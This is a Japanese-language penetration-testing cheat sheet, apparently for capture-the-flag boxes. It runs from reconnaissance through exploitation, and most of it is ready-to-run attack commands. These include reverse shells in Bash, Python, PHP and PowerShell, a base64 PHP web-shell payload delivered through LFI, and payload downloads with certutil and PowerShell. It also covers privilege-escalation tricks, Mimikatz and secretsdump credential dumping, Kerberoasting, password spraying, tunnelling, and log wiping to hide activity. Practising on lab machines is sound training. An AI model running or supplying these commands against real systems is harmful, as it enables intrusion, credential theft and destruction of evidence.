#  チートシート
---

##  目次

1. [偵察・列挙（Recon / Enumeration）](#偵察列挙)
2. [Webアプリケーション](#webアプリケーション)
3. [脆弱性スキャン](#脆弱性スキャン)
4. [エクスプロイト（Metasploit）](#エクスプロイトmetasploit)
5. [シェル・接続](#シェル接続)
6. [ファイル転送](#ファイル転送)
7. [権限昇格（Linux）](#権限昇格linux)
8. [権限昇格（Windows）](#権限昇格windows)
9. [パスワードクラック・ハッシュ](#パスワードクラックハッシュ)
10. [Active Directory / Kerberos](#active-directory--kerberos)
11. [ネットワーク・トンネリング](#ネットワークトンネリング)
12. [フラグ取得・後処理](#フラグ取得後処理)

---

## 偵察・列挙

### Nmap

```bash
# 基本スキャン
nmap -sC -sV -oN nmap/initial.txt <IP>

# 全ポートスキャン（高速）
nmap -p- --min-rate 5000 -oN nmap/allports.txt <IP>

# UDP スキャン
nmap -sU --top-ports 200 <IP>

# スクリプトカテゴリ指定
nmap -sV --script=vuln <IP>
nmap -sV --script=smb-enum-shares <IP>

# OS 検出
nmap -O -sV <IP>
```

### サービス別列挙

#### FTP (21)
```bash
ftp <IP>                          # 匿名ログイン試行（user: anonymous）
nmap -p21 --script ftp-anon <IP>
```

#### SSH (22)
```bash
ssh user@<IP>
ssh -i id_rsa user@<IP>          # 秘密鍵でログイン
ssh-keygen -t rsa                # 鍵生成
```

#### SMB (445)
```bash
smbclient -L //<IP>/             # 共有一覧
smbclient //<IP>/share -N       # 匿名接続
enum4linux -a <IP>              # 全列挙
crackmapexec smb <IP>           # 情報収集
impacket-smbclient <IP>
```

#### LDAP (389)
```bash
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
```

#### SNMP (161)
```bash
snmpwalk -c public -v1 <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

#### RPC (111/135)
```bash
rpcclient -U "" -N <IP>
rpcclient> enumdomusers
rpcclient> enumdomgroups
```

---

## Webアプリケーション

### ディレクトリ探索

```bash
# Gobuster
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dns -d domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Feroxbuster
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# wfuzz（サブドメイン）
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://domain.htb" -H "Host: FUZZ.domain.htb" --hc 302
```

### Nikto
```bash
nikto -h http://<IP>
```

### SQLインジェクション

```bash
# 手動テスト
' OR '1'='1
' OR 1=1--
" OR "1"="1

# SQLmap
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -u "http://<IP>/page?id=1" -D dbname --tables
sqlmap -u "http://<IP>/page?id=1" -D dbname -T users --dump
sqlmap -u "http://<IP>/login" --data="user=admin&pass=test" --dbs
```

### LFI / ディレクトリトラバーサル
```bash
http://<IP>/page?file=../../../../etc/passwd
http://<IP>/page?file=php://filter/convert.base64-encode/resource=index.php
http://<IP>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### XSS テスト
```bash
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## 脆弱性スキャン

```bash
# Searchsploit
searchsploit <service name>
searchsploit -x <exploit_id>     # コード表示
searchsploit -m <exploit_id>     # カレントにコピー

# Nuclei
nuclei -u http://<IP> -t cves/
nuclei -u http://<IP> -severity critical,high
```

---

## エクスプロイト（Metasploit）

```bash
msfconsole

# 基本コマンド
search <keyword>
use <module_path>
info
show options
set RHOSTS <IP>
set LHOST <your_IP>
set LPORT 4444
run / exploit

# セッション管理
sessions -l
sessions -i <id>

# よく使うモジュール例
use exploit/multi/handler                        # リバースシェル待受
use exploit/windows/smb/ms17_010_eternalblue    # EternalBlue
use auxiliary/scanner/smb/smb_login             # SMB ブルートフォース
```

---

## シェル・接続

### リバースシェル

```bash
# リスナー起動
nc -lvnp 4444
rlwrap nc -lvnp 4444   # readline対応

# Bash
bash -i >& /dev/tcp/<your_IP>/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("<your_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell（Windows）
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<your_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### シェルの安定化（TTY）

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200
```

### その他接続

```bash
evil-winrm -i <IP> -u user -p password     # WinRM
impacket-psexec user:pass@<IP>             # PSExec
impacket-wmiexec user:pass@<IP>            # WMIExec
```

---

## ファイル転送

### Linux → ターゲット

```bash
# Python HTTP サーバー（攻撃側）
python3 -m http.server 8080

# ターゲット側でダウンロード
wget http://<your_IP>:8080/file
curl http://<your_IP>:8080/file -o file

# NC
nc -lvnp 4444 < file.txt         # 送信側
nc <IP> 4444 > file.txt          # 受信側
```

### Windows へ転送

```powershell
# PowerShell
Invoke-WebRequest -Uri http://<your_IP>:8080/file.exe -OutFile C:\Temp\file.exe
(New-Object Net.WebClient).DownloadFile("http://<your_IP>:8080/file.exe","C:\Temp\file.exe")

# certutil
certutil -urlcache -split -f http://<your_IP>:8080/file.exe C:\Temp\file.exe

# bitsadmin
bitsadmin /transfer myJob http://<your_IP>:8080/file.exe C:\Temp\file.exe
```

### SCP / Impacket SMB

```bash
scp file user@<IP>:/tmp/
impacket-smbserver share $(pwd) -smb2support   # SMB サーバー起動
# Windows側: copy \\<your_IP>\share\file.exe .
```

---

## 権限昇格（Linux）

### 情報収集

```bash
id && whoami
uname -a
cat /etc/os-release
sudo -l                          # sudo 権限確認
find / -perm -4000 2>/dev/null   # SUID バイナリ
find / -perm -2000 2>/dev/null   # SGID バイナリ
find / -writable -type f 2>/dev/null | grep -v proc
crontab -l && cat /etc/crontab   # cron ジョブ確認
env                              # 環境変数
cat /etc/passwd && cat /etc/shadow
```

### 自動化ツール

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh | tee linpeas.out

# LinEnum
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t

# pspy（プロセス監視）
./pspy64
```

### GTFOBins（SUID / sudo 悪用）

```bash
# GTFOBins を参照: https://gtfobins.github.io/

# 例: sudo vim
sudo vim -c ':!/bin/bash'

# 例: sudo find
sudo find . -exec /bin/bash \; -quit

# 例: sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### 代表的な権限昇格手法

```bash
# Writable /etc/passwd に新ユーザー追加
echo 'hacker:$1$hacker$hash:0:0::/root:/bin/bash' >> /etc/passwd

# PATH ハイジャック
export PATH=/tmp:$PATH
echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls

# 弱い cron ジョブに書き込み
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# ...しばらく待つ
/bin/bash -p
```

---

## 権限昇格（Windows）

### 情報収集

```powershell
whoami /all                      # 権限・グループ確認
systeminfo
net users && net localgroup administrators
Get-LocalUser
Get-LocalGroup
tasklist /svc                    # サービス一覧
sc query                         # サービス状態
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer   # AlwaysInstallElevated
wmic service list brief
```

### 自動化ツール

```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe all
```

### 代表的な手法

```powershell
# AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# PrintSpoofer（SeImpersonatePrivilege）
.\PrintSpoofer64.exe -i -c cmd

# JuicyPotato / GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

## パスワードクラック・ハッシュ

### Hashcat

```bash
# ハッシュ種類特定
hashid <hash>
hash-identifier

# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA-256
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# ルール適用
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### John the Ripper

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
john --format=nt hash.txt --wordlist=rockyou.txt

# SSH 秘密鍵
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt

# ZIP
zip2john file.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
```

### Hydra（ブルートフォース）

```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# HTTP POST
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP
hydra -l anonymous -P rockyou.txt ftp://<IP>
```

---

## Active Directory / Kerberos

### 列挙

```bash
# BloodHound 収集
bloodhound-python -u user -p pass -ns <IP> -d domain.local -c all

# ldapdomaindump
ldapdomaindump ldap://<IP> -u 'domain\user' -p pass

# CrackMapExec
crackmapexec smb <IP> -u user -p pass --shares
crackmapexec smb <IP> -u user -p pass --users
crackmapexec smb <IP> -u user -p pass --groups
```

### Kerberos 攻撃

```bash
# AS-REP Roasting（事前認証不要ユーザー）
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <IP>
hashcat -m 18200 asrep.hash rockyou.txt

# Kerberoasting
impacket-GetUserSPNs domain.local/user:pass -dc-ip <IP> -request
hashcat -m 13100 tgs.hash rockyou.txt

# Pass the Hash
impacket-psexec -hashes :NTLMHASH domain/user@<IP>
crackmapexec smb <IP> -u user -H NTLMHASH

# DCSync
impacket-secretsdump domain/user:pass@<IP>
impacket-secretsdump -hashes :NTLMHASH domain/user@<IP>
```

### Kerbrute（ユーザー列挙）

```bash
kerbrute userenum -d domain.local --dc <IP> users.txt
kerbrute passwordspray -d domain.local --dc <IP> users.txt 'Password123'
```

---

## ネットワーク・トンネリング

### SSH トンネル

```bash
# ローカルフォワーディング（踏み台経由でアクセス）
ssh -L 8080:target_IP:80 user@pivot_IP

# リモートフォワーディング
ssh -R 4444:localhost:4444 user@<your_IP>

# Dynamic（SOCKS プロキシ）
ssh -D 1080 user@pivot_IP
# proxychains.conf に: socks5 127.0.0.1 1080
proxychains nmap -sT <target_IP>
```

### Chisel

```bash
# サーバー側（攻撃マシン）
./chisel server -p 8000 --reverse

# クライアント側（踏み台）
./chisel client <your_IP>:8000 R:socks
./chisel client <your_IP>:8000 R:4444:127.0.0.1:4444
```

### Ligolo-ng

```bash
# プロキシ起動（攻撃マシン）
./proxy -selfcert -laddr 0.0.0.0:11601

# エージェント起動（踏み台）
./agent -connect <your_IP>:11601 -ignore-cert

# ligolo > session 選択後
>> start
# ルーティング追加
ip route add 192.168.1.0/24 dev ligolo
```

---

## フラグ取得・後処理

### フラグ場所

```bash
# Linux
cat /root/root.txt
cat /home/<user>/user.txt
find / -name "*.txt" 2>/dev/null | grep -E "(root|user)\.txt"

# Windows
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<user>\Desktop\user.txt
```

### ハッシュ・認証情報ダンプ

```bash
# Linux
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Windows（Mimikatz）
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```

### クリーンアップ

```bash
# ログ削除（Linux）
history -c && echo "" > ~/.bash_history
rm /tmp/linpeas.sh /tmp/pspy64

# Windows イベントログ消去
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

---

## リソース

| リソース | URL |
|---|---|
| GTFOBins | https://gtfobins.github.io |
| LOLBAS（Windows） | https://lolbas-project.github.io |
| RevShells | https://www.revshells.com |
| HackTricks | https://book.hacktricks.xyz |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| ExplainShell | https://explainshell.com |

---

